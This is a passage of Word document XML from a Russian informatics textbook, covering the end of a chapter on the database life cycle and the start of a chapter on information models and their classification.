        <w:t>**Расчёт:** База данных социальной сети: 10 млн пользователей, каждый делает в среднем 2 поста в месяц. Размер одного поста (с метаданными): 500 байт. Сколько места займут посты за год? Если SSD стоит 5000 руб/ТБ, сколько будет стоить хранение данных за 5 лет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В этой главе мы разобрали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>жизненный цикл баз данных</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **8 фаз:** анализ требований → проектирование (концептуальное, логическое, физическое) → реализация → заполнение данными → тестирование → эксплуатация → поддержка → вывод из эксплуатации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **ER-диаграммы** для концептуального моделирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Таблицы, ключи, индексы** для логического и физического проектирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Миграция данных** из старых систем (Excel, CSV, другие БД)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Тестирование производительности** с помощью индексов и EXPLAIN ANALYZE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Эксплуатация:** бэкапы, мониторинг, обновления схемы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Масштабирование:** вертикальное (больше ресурсов) и горизонтальное (репликация, шардирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Модели жизненного цикла:** Waterfall (последовательно) vs Agile (итеративно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как правильно спроектировать БД (чтобы потом не переделывать)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зачем нужны индексы (и почему без них всё тормозит)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как мигрировать данные из Excel/Access (и не сойти с ума)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как масштабировать БД при росте нагрузки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему бэкапы критичны (и как не потерять все данные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>База данных — это не просто таблички с данными. Это сложная система, которая живёт годами, меняется, растёт, ломается и требует постоянного ухода. Понимание жизненного цикла БД — это ключ к созданию надёжных и масштабируемых приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Объём главы: ~14500 символов_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 4.2: Информационные модели. Моделирование процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, в прошлой главе мы разобрались с жизненным циклом баз данных. Но перед тем, как начать проектировать БД (или вообще что угодно), нужно понять, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что мы вообще делаем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. И тут на сцену выходят </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>модели</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь: ты хочешь построить дом. Ты же не берёшь кирпич и не начинаешь лепить куда попало? Нет, сначала архитектор рисует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>план</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (модель дома). Модель — это упрощённое представление реальности, которое помогает понять, как всё устроено, и не облажаться при реализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.1** (Жизненный цикл БД) — фаза "Анализ требований" = моделирование предметной области</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.3** (Классификация видов моделирования) — там подробнее про типы моделей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.1** (Инфологическое моделирование) — моделирование БД через ER-диаграммы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без моделирования получается хаос: начинаешь писать код, потом понимаешь, что забыл про половину требований, переделываешь, снова забыл что-то, и в итоге проект превращается в говнокод, который никто не понимает, включая тебя самого через полгода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.1. Что такое модель и зачем она нужна</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель (model)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это упрощённое представление реального объекта, процесса или системы, созданное для изучения, прогнозирования или оптимизации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Моделирование (modeling)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс создания модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия из жизни:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Карта города** — модель реальной местности. На карте нет каждого дерева и каждого камня, но есть всё важное: улицы, здания, остановки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Манекен** — модель человека для примерки одежды. У него нет внутренних органов и мозга (как у некоторых людей), но есть пропорции тела.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глобус** — модель Земли. Только вот Земля не идеально круглая, а глобус — да. Но для общего понимания сойдёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Зачем нужны модели?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Упрощение реальности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Реальность слишком сложная. Попробуй описать работу Google полностью — утонешь в деталях. Модель оставляет только то, что важно для текущей задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель метро (схема линий). На схеме линии выглядят как прямые и перпендикулярные, хотя в реальности метро извивается как змея. Но для пассажира важно только </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какие станции и где пересадки</w:t>
      </w:r>
      <w:r>
        <w:t>, а не геометрия тоннелей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Прогнозирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модели помогают предсказать, что будет, если изменить что-то в системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель роста населения. Зная текущую численность населения и коэффициент рождаемости, можно спрогнозировать, сколько людей будет через 10 лет. (Хотя жизнь часто показывает средний палец таким прогнозам.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Оптимизация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модель позволяет найти лучшее решение без экспериментов в реальности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель логистики склада. Вместо того, чтобы перекладывать реальные коробки 100 раз, моделируешь в программе и находишь оптимальное расположение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Обучение и демонстрация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модель помогает понять, как работает сложная система.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Симулятор полёта. Пилоты учатся на симуляторе, чтобы не убить реальных пассажиров при обучении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Документирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модель = документация системы. Блок-схема или диаграмма UML расскажет новому разработчику, как работает система, быстрее, чем чтение 10 тысяч строк кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.2. Материальные и информационные модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модели делятся на два больших класса:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Материальные модели (физические)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Материальная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это реальный физический объект, который воспроизводит свойства оригинала.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Макет здания (архитектор показывает заказчику, как будет выглядеть дом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель самолёта в аэродинамической трубе (проверяют, как он будет летать)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Манекен для краш-тестов автомобилей (чтобы не убивать людей при тестах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Муляж человеческого сердца в медицинском институте</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Наглядность, можно потрогать руками.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дорого, долго создавать, сложно изменять.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Информационные модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это абстрактное описание системы с помощью информации: текста, графики, формул, таблиц, кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текст закона (модель правовых отношений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Чертёж дома (модель здания)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блок-схема алгоритма (модель процесса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>База данных сотрудников (модель отдела кадров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Математическое уравнение `F = ma` (модель динамики тела)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дёшево, быстро создавать, легко изменять, можно анализировать на компьютере.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Менее наглядно, чем физическая модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В информатике нас интересуют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только информационные модели</w:t>
      </w:r>
      <w:r>
        <w:t>, потому что мы работаем с данными, а не с кирпичами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.3. Классификация информационных моделей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информационные модели можно классифицировать по разным критериям.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По способу представления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Вербальные (словесные) модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описание системы текстом на естественном языке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Техническое задание (ТЗ) на разработку сайта:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&gt; "Сайт должен содержать главную страницу, каталог товаров, корзину и форму оплаты. Пользователь может зарегистрироваться через email или войти через Google."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Понятно любому человеку.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Двусмысленность, сложно формализовать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Графические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Представление в виде схем, диаграмм, графиков, чертежей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блок-схема алгоритма** (rectangles, diamonds, arrows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диаграмма UML** (Use Case, Class Diagram, Activity Diagram)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ER-диаграмма** (Entity-Relationship, модель БД)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Граф** (узлы и рёбра: схема метро, социальная сеть)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Карта сайта** (sitemap)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Наглядно, легко увидеть связи.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если система большая, схема превращается в кашу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Табличные модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Представление данных в виде таблиц (строки = объекты, столбцы = атрибуты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Таблица учёта товаров на складе:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| ID  | Название   | Цена  | Количество |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --- | ---------- | ----- | ---------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1   | Молоко     | 80 ₽  | 50         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2   | Хлеб       | 40 ₽  | 100        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3   | Колбаса    | 350 ₽ | 20         |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компактно, легко обрабатывать компьютером.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Плохо показывает связи между объектами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Математические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описание системы через формулы и уравнения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель роста населения (экспоненциальный рост):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(t) = P₀ × e^(r×t)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`P(t)` — численность населения в момент времени `t`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`P₀` — начальная численность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r` — коэффициент роста (рождаемость минус смертность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`e` — основание натурального логарифма (≈2.718)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Точность, можно моделировать на компьютере.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Требует математических знаний, не всегда понятно непрофессионалу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Структурные (иерархические) модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описание системы через древовидную или сетевую структуру.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файловая система (папки и файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Организационная структура компании (директор → отделы → сотрудники)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Родословное дерево (генеалогическое древо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Хорошо показывает иерархию.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Плохо справляется с многими связями (если у узла много родителей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По области применения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Экономические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модели рынка, цен, спроса и предложения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель "спрос-предложение" (supply-demand curve).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Технические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модели машин, механизмов, алгоритмов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Блок-схема работы двигателя внутреннего сгорания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Биологические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модели экосистем, популяций, эпидемий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель распространения вируса (SIR-модель: Susceptible, Infected, Recovered).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Социальные модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Модели общества, организаций, взаимодействий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
